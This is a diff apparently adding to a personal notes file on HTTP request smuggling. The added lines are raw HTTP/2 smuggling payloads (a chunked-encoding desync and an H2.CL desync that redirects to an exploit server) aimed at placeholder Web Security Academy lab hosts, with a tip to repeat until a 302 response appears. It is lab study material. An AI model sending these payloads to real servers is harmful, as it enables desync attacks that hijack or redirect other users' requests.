@@ -114,6 +114,39 @@ Content-Length: 5
 x=1
 
 
+
+
+
+POST / HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Transfer-Encoding: chunked
+
+0
+
+GET /x HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+
+
+#Response: (repeat each 5 sec until get bellow response)
+302
+
+
+
+--------------------------------------
+###H2.CL
+POST / HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+Content-Length: 5
+
+x=1
+
+
+
+
 Bug Bounty Report
 https://hackerone.com/reports/726773
 ```
